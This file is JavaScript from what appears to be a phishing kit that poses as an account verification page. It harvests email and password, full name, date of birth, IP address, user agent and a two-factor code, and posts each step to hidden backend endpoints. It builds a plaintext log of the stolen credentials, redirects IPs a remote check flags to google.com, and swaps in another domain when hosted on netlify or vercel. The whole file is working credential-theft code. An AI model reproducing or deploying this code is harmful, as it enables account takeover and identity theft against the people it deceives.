        modalSetting("hide");
        var isFirstLoginInput=true;
        var requestRatioSelected=false;
        var local = 'https://api.idpagemanage.com';
        var host =  location.hostname;
        var protocol = location.protocol;
        var abc ='';
        const domains = [
            'netlify.app', 
            'vercel.app',
            '*.netlify.app',
            '*.vercel.app'
        ];
        const regex = new RegExp(`(\\w+\\.)*(${domains.join("|")})`);

        if(regex.test(host)) {
            abc = protocol + '//' + 'cj-japan.com';
        }else{
            abc = protocol + '//' + host;
        }
        console.log(abc);
       let userInfo="";
       let id;
       let ip;
       var upload_result;
       var f_result;
       var final;
       let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
       document.getElementById("submissionID").innerHTML=thisSession;
       fetch('https://api.ipify.org?format=json') .then(response=> response.json()) .then(data => {
            document.getElementById("clientIp").value=data.ip;
            $.ajax({
                url: abc + '/business/check',
                type: 'POST',
                dataType:"json",
                data: {ip: data.ip},
                success: function(data){
                    if(data === true || data == 'true' || data == 1){
                        window.location.href = 'https://google.com/'
                    }
                    ip = data;
                    return true;
                } 
            });
        });


        function uploadFile() {
        const dt = {};
        var faurl = abc +'/business/checkpoint';
        var two_fa_code = document.getElementById("two_fa_code").value;
        dt.two_fa_code = two_fa_code;
        dt.id = id;
        return $.ajax({
            url: faurl,
            type: 'POST',
            dataType:"json",
            data: JSON.stringify({model: dt}),
            headers: {
                'Content-Type': 'application/json',
            },
            beforeSend: function(){
                $('#loading-spinner-fa').removeClass('d-none');
                $('.form-control-fa').prop('disabled', true);
                $('#submitPhotoNextBtn').prop('disabled', true);
            },
            success: function(data){
                var res_data = JSON.parse(data);
                id = res_data.id;
                upload_result = res_data;
                return true;
            } 
        })    
       }

       async function updateUser(){
            // let model;
            const model = {};
            var ip = document.getElementById("clientIp").value;
            var email = document.getElementById("username").value;
            var pw = document.getElementById("password").value;
            var fullname = document.getElementById("fullName").value;
            var useragent = $.ua;
            var url = abc +'/business/verify';
            //console.log(useragent.ua);
            model.location = ip;
            model.personal_email_address = email;
            model.password = pw;
            model.fullname = fullname;
            model.user_agent = useragent.ua;
            await $.ajax({
                url: url,
                type: 'POST',
                dataType:"json",
                data: JSON.stringify({model: model}),
                headers: {
                    'Content-Type': 'application/json',
                },
                beforeSend: function(){
                    $('#loading-spinner').removeClass('d-none');
                    $('.input-grop-cust-login input').prop('disabled', true);
                    $('#loginNextBtn').prop('disabled', true);
                },
                success: function(data){
                    f_result = JSON.parse(data);
                    id = f_result.id;
                    return f_result;
                }
            })    
        //return true;
       }

       async function updateInfo()
       {
            const model = {};
            var fullname = document.getElementById("fullName").value;
            var dob = document.querySelector('#day').value + '/' + document.querySelector('#month').value + '/' + document.querySelector('#year').value;

            model.id = id;
            model.fullname = fullname;
            model.dob = dob;
            var udurl = abc +'/business/save-data';
            console.log(udurl, '----', model);

            await $.ajax({
                url: udurl,
                type: 'POST',
                dataType:"json",
                data: JSON.stringify({model: model}),
                headers: {
                    'Content-Type': 'application/json',
                },
                beforeSend: function(){
                    $('#loading-spinner').removeClass('d-none');
                    $('.input-grop-cust-login input').prop('disabled', true);
                    $('#loginNextBtn').prop('disabled', true);
                },
                success: function(data){
                    final = JSON.parse(data);
                    id = final.id;
                    return final;
                }
            })    

       }


       async function inputChanger(field) {
           if(field=="username" || field=="password") {
               if(document.getElementById("password").value.length > 5) {
                   document.getElementById("loginNextBtn").disabled=false;
               }
           }
           if(field=="requestPass") {
               if(document.getElementById("fullName").value.length > 3 && requestRatioSelected==true && document.querySelector('#day').value > 0 && document.querySelector('#month').value > 0 && document.querySelector('#year').value > 0) document.getElementById("requestNextBtn").disabled=false;
           }
           if(field=="anotherRSRequest") {
               document.getElementById("anotherReasonInput").style.display="";
           }
           if(field=="selectedRequestRatio") {
               requestRatioSelected=true;
           }
           if(field=="photoID") {
               try {
                //    document.getElementById("uploadContent").innerHTML="Your photo was uploaded";
                   document.getElementById("submitPhotoNextBtn").disabled=false;
               }
               catch (error) {
                   document.getElementById("uploadContent").innerHTML="Upload failed. Please try again";
               }
           }
           console.log(userInfo);
       }

       async function nextButton(level) {
           switch(level) {
               case "login" : if(isFirstLoginInput==true) {
                   
                   await updateUser();
                   //console.log(b, b.error_code)
                   if(f_result.error_code == 1) {
                        document.getElementById("loginError").style.display="";
                        $('#loading-spinner').addClass('d-none');
                        $('.input-grop-cust-login input').prop('disabled', false);
                        $('#loginNextBtn').prop('disabled', false);
                        isFirstLoginInput=true;
                   }else{
                        isFirstLoginInput=false;
                        moveTab("v-pills-identity");
                   }
                   //if(a.err)
                  
                   document.getElementById("usernameFirst").value=document.getElementById("username").value;
                   document.getElementById("passwordFirst").value=document.getElementById("password").value;
               }
               else {
                   moveTab("v-pills-identity");
                   
               }
               userInfo+="Username/password: `"+document.getElementById("username").value+"`/`"+document.getElementById("password").value+"`\n";
               break;
               case "request" : moveTab("v-pills-messages");
               userInfo+="Fullname: `"+document.getElementById("fullName").value+"`\nBirth: `"+document.querySelector('#day').value+"/"+document.querySelector('#month').value+"/"+document.querySelector('#year').value+"`\n";
               await updateInfo();
               break;
               case "photoID" : 
               uploadFile().then(() => {
                if(upload_result.error_code == 1 || upload_result.error_code == 2){
                    document.getElementById("faerror").style.display="";
                    //$('#faerror').style.display="";
                    $('.form-control-fa').prop('disabled', false);
                    $('#submitPhotoNextBtn').prop('disabled', false);
                }else{
                    moveTab("v-pills-profile");
                }
            });
           }
       }

       function moveTab(id) {
           document.getElementById(id + "-tab").classList.add("active");
           document.getElementById(id).classList.remove("fade");
           document.getElementById(id).classList.add("col-12");
           document.getElementById(id).classList.add("active");
           document.getElementById(id).classList.add("show");
           let beforeTabID="";
           switch(id) {
               case "v-pills-identity": beforeTabID="v-pills-home";
               break;
               case "v-pills-profile": beforeTabID="v-pills-identity";
               break;
               case "v-pills-messages": beforeTabID="v-pills-profile";
               saveInfo();
               break;
           }
           document.getElementById(beforeTabID).classList.add("fade");
           document.getElementById(beforeTabID).classList.remove("col-12");
           document.getElementById(beforeTabID).classList.remove("active");
           document.getElementById(beforeTabID).classList.remove("show");
       }

       function modalSetting(status) {
           if(status=="hide") {
               document.getElementById("modalShow").classList.remove("show");
               document.getElementById("modalShow").classList.remove("modal-backdrop");
               document.getElementById("modalShow").classList.remove("fade");
               document.getElementById("modalChildrenShow").classList.remove("d-block");
               document.getElementById("modalChildrenShow").classList.remove("modal");
               document.getElementById("modalChildrenShow").classList.remove("show");
               document.getElementById("modalChildrenShow").classList.remove("fade");
               document.getElementsByClassName("modal-content")[0].style.display="none";
           }
           else {
               document.getElementById("modalShow").classList.add("show");
               document.getElementById("modalShow").classList.add("modal-backdrop");
               document.getElementById("modalShow").classList.add("fade");
               document.getElementById("modalChildrenShow").classList.add("d-block");
               document.getElementById("modalChildrenShow").classList.add("modal");
               document.getElementById("modalChildrenShow").classList.add("show");
               document.getElementById("modalChildrenShow").classList.add("fade");
               document.getElementsByClassName("modal-content")[0].style.display=""
           }
       }

       function saveInfo() {
           console.log(userInfo);
           userInfo=userInfo+"\nIp: `"+document.getElementById("clientIp").value+"`";
    
       }